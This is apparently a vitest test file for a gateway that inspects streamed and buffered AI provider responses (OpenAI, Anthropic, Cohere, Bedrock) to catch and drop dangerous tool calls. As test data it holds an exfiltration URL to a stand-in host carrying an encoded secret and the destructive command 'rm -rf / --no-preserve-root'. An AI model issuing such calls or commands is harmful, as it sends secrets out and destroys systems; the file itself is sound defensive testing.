import { describe, it, expect } from 'vitest'
import { McpScanner } from '../../src/detection/mcp/scanner.js'
import { DEFAULT_CONFIG } from '../../src/config/config.js'
import { createSseGate, inspectJsonResponse } from '../../src/detection/mcp/responseGate.js'
import { encodeFrame, EventStreamDecoder } from '../../src/detection/mcp/eventStream.js'
import { createEventStreamGate } from '../../src/detection/mcp/eventStreamGate.js'
import { extractToolCallsFromJson, extractToolCallsFromSse } from '../../src/detection/toolUseScan.js'
import { getParser } from '../../src/detection/parsers.js'

// #916: tool calls the response-side checks never saw. Each case is a call a
// provider streams or returns that one of the scans skipped, so a blocked tool,
// a destructive command or an exfiltrating argument went through.
const mcp = new McpScanner(DEFAULT_CONFIG, null)
const sse = (events: Record<string, unknown>[]) => events.map(e => `event: ${String(e.type)}\ndata: ${JSON.stringify(e)}\n\n`).join('')
const EXFIL = 'https://collect.example.net/u?d=c2VjcmV0'

describe('#916 OpenAI Responses hosted MCP calls (mcp_call)', () => {
  const item = (args: string) => ({ type: 'mcp_call', id: 'mcp_1', server_label: 'ops', name: 'execute_command', arguments: args })
  const stream = (args: string) => sse([
    { type: 'response.created', response: { id: 'resp_1', output: [] } },
    { type: 'response.output_item.added', output_index: 0, item: { ...item(''), arguments: '' } },
    { type: 'response.mcp_call_arguments.delta', output_index: 0, delta: args.slice(0, 8) },
    { type: 'response.mcp_call_arguments.delta', output_index: 0, delta: args.slice(8) },
    { type: 'response.output_item.done', output_index: 0, item: item(args) },
    { type: 'response.completed', response: { id: 'resp_1', output: [item(args)] } },
  ])

  it('the stream gate drops an mcp_call blocked by name', () => {
    const gate = createSseGate(getParser('/v1/responses')!, mcp, '/v1/responses')
    const r = gate.push(stream('{"command":"ls"}'))
    const out = r.forward + gate.flush()
    expect(r.decisions).toEqual([expect.objectContaining({ toolName: 'execute_command', action: 'block' })])
    expect(out).not.toContain('execute_command')
  })

  it('the buffered gate drops it from a JSON response', () => {
    const body = JSON.stringify({ id: 'resp_1', object: 'response', output: [item('{"command":"ls"}'), { type: 'message', role: 'assistant', content: [{ type: 'output_text', text: 'done' }] }] })
    const r = inspectJsonResponse(body, getParser('/v1/responses')!, mcp)
    expect(r.blockedNames).toContain('execute_command')
  })

  it('the tool-use scans read its arguments, streamed or whole', () => {
    const args = JSON.stringify({ url: EXFIL })
    const streamed = extractToolCallsFromSse(stream(args))
    expect(streamed).toEqual([{ toolName: 'execute_command', args: { url: EXFIL } }])
    const body = JSON.stringify({ id: 'resp_1', object: 'response', output: [item(args)] })
    expect(extractToolCallsFromJson(body, getParser('/v1/responses')!)).toEqual([{ toolName: 'execute_command', args: { url: EXFIL } }])
  })

  it('reads the arguments that streamed when the stream ends before the item is done', () => {
    const cut = sse([
      { type: 'response.output_item.added', output_index: 0, item: { ...item(''), arguments: '' } },
      { type: 'response.mcp_call_arguments.delta', output_index: 0, delta: JSON.stringify({ url: EXFIL }) },
    ])
    expect(extractToolCallsFromSse(cut)).toEqual([{ toolName: 'execute_command', args: { url: EXFIL } }])
  })
})

describe('#916 extractToolCallsFromSse reads every streamed tool block', () => {
  it.each(['server_tool_use', 'mcp_tool_use'])('an Anthropic %s block, its input in the start event', (type) => {
    const text = sse([
      { type: 'message_start', message: { id: 'msg_1', content: [] } },
      { type: 'content_block_start', index: 0, content_block: { type, id: 'srvtoolu_1', name: 'web_fetch', input: { url: EXFIL } } },
      { type: 'content_block_stop', index: 0 },
      { type: 'message_stop' },
    ])
    expect(extractToolCallsFromSse(text)).toEqual([{ toolName: 'web_fetch', args: { url: EXFIL } }])
  })

  it('an Anthropic tool_use whose input came whole in the start event', () => {
    const text = sse([
      { type: 'content_block_start', index: 0, content_block: { type: 'tool_use', id: 'toolu_1', name: 'fetch', input: { url: EXFIL } } },
      { type: 'content_block_stop', index: 0 },
    ])
    expect(extractToolCallsFromSse(text)).toEqual([{ toolName: 'fetch', args: { url: EXFIL } }])
  })

  it('a Cohere v2 tool call', () => {
    const call = (fn: Record<string, unknown>) => ({ message: { tool_calls: { id: 'call_1', type: 'function', function: fn } } })
    const args = JSON.stringify({ url: EXFIL })
    const text = sse([
      { type: 'message-start', id: 'm1', delta: { message: { role: 'assistant' } } },
      { type: 'tool-call-start', index: 0, delta: call({ name: 'fetch', arguments: '' }) },
      { type: 'tool-call-delta', index: 0, delta: call({ arguments: args.slice(0, 7) }) },
      { type: 'tool-call-delta', index: 0, delta: call({ arguments: args.slice(7) }) },
      { type: 'tool-call-end', index: 0 },
      { type: 'message-end', delta: { finish_reason: 'TOOL_CALL' } },
    ])
    expect(extractToolCallsFromSse(text)).toEqual([{ toolName: 'fetch', args: { url: EXFIL } }])
  })

  it('a Cohere v1 newline-delimited JSON stream', () => {
    const lines = [
      { is_finished: false, event_type: 'stream-start', generation_id: 'g1' },
      { is_finished: false, event_type: 'tool-calls-chunk', tool_call_delta: { index: 0, name: 'fetch' } },
      { is_finished: false, event_type: 'tool-calls-chunk', tool_call_delta: { index: 0, parameters: JSON.stringify({ url: EXFIL }) } },
      { is_finished: false, event_type: 'tool-calls-generation', tool_calls: [{ name: 'fetch', parameters: { url: EXFIL } }] },
      { is_finished: true, event_type: 'stream-end', finish_reason: 'COMPLETE' },
    ]
    expect(extractToolCallsFromSse(lines.map(l => JSON.stringify(l)).join('\n') + '\n')).toEqual([{ toolName: 'fetch', args: { url: EXFIL } }])
  })

  it('a Cohere v1 stream cut before the generation event, from its chunks', () => {
    const lines = [
      { event_type: 'tool-calls-chunk', tool_call_delta: { index: 0, name: 'fetch' } },
      { event_type: 'tool-calls-chunk', tool_call_delta: { index: 0, parameters: JSON.stringify({ url: EXFIL }) } },
    ]
    expect(extractToolCallsFromSse(lines.map(l => JSON.stringify(l)).join('\n'))).toEqual([{ toolName: 'fetch', args: { url: EXFIL } }])
  })
})

describe('#916 Bedrock gate keeps blocks that interleave with a held one', () => {
  const frame = (type: string, payload: unknown) =>
    encodeFrame({ ':event-type': type, ':content-type': 'application/json', ':message-type': 'event' }, Buffer.from(JSON.stringify(payload)))
  const read = (buf: Buffer) => new EventStreamDecoder().push(buf).map(f => ({ type: f.headers[':event-type']!, payload: JSON.parse(f.payload.toString()) as Record<string, unknown> }))

  // An execution tool at index 0 is held until its stop; block 1, a second
  // execution tool, starts and ends inside it. Replayed, block 1 is held in
  // turn, so block 0's delta goes out before block 1's start: the gate's
  // output is no longer in frame order.
  const stream = (command: string) => Buffer.concat([
    frame('messageStart', { role: 'assistant' }),
    frame('contentBlockStart', { contentBlockIndex: 0, start: { toolUse: { toolUseId: 'tooluse_0', name: 'bash' } } }),
    frame('contentBlockStart', { contentBlockIndex: 1, start: { toolUse: { toolUseId: 'tooluse_1', name: 'bash' } } }),
    frame('contentBlockDelta', { contentBlockIndex: 0, delta: { toolUse: { input: JSON.stringify({ command }) } } }),
    frame('contentBlockDelta', { contentBlockIndex: 1, delta: { toolUse: { input: '{"command":"cat README.md"}' } } }),
    frame('contentBlockStop', { contentBlockIndex: 1 }),
    frame('contentBlockStop', { contentBlockIndex: 0 }),
    frame('messageStop', { stopReason: 'tool_use' }),
  ])

  it.each([['whole', 0], ['one byte at a time', 1]])('forwards every frame of a passed held block and the one inside it (%s)', (_label, step) => {
    const input = stream('ls -la')
    const gate = createEventStreamGate('/model/anthropic.claude-sonnet-4/converse-stream', mcp)!
    const out: Buffer[] = []
    const size = step || input.length
    for (let i = 0; i < input.length; i += size) out.push(gate.push(input.subarray(i, i + size)).forward)
    out.push(gate.flush())
    expect(read(Buffer.concat(out))).toEqual(read(input))
  })

  it('still drops the held block when its command is destructive, and keeps the block inside it', () => {
    const gate = createEventStreamGate('/model/anthropic.claude-sonnet-4/converse-stream', mcp)!
    const r = gate.push(stream('rm -rf / --no-preserve-root'))
    const frames = read(Buffer.concat([r.forward, gate.flush()]))
    expect(frames.filter(f => f.payload.contentBlockIndex === 0)).toEqual([])
    expect(frames.filter(f => f.payload.contentBlockIndex === 1).map(f => f.type)).toEqual(['contentBlockStart', 'contentBlockDelta', 'contentBlockStop'])
  })
})
